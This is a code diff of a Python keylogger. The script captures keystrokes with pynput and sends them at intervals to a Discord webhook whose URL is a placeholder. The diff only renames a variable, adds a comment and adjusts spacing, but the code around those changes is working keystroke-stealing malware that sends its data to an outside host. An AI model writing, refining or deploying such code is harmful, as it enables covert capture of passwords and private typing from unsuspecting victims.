@@ -1,11 +1,11 @@
 # REQUIREMENTS
 from pynput.keyboard import Key, Listener
-from discord_webhook import DiscordWebhook, webhook
+from discord_webhook import DiscordWebhook,webhook
 import threading
 import time
 
-keystrokes=""
-Webhook = "your discord webhook url"
+keystrokes=""#To dump the keystrokes
+WEBHOOK = "your discord webhook url"
 Interval =60 #Mention your desired time in seconds
 
 # Capturing keystrokes
@@ -20,7 +20,7 @@ def send_keystrokes ():
     while(1):
         if keystrokes=="": 
             continue
-        webhook=DiscordWebhook(url=Webhook,content=keystrokes)
+        webhook=DiscordWebhook(url=WEBHOOK,content=keystrokes)
         response=webhook.execute()
         print("-----*SENT*-----")
         keystrokes=""
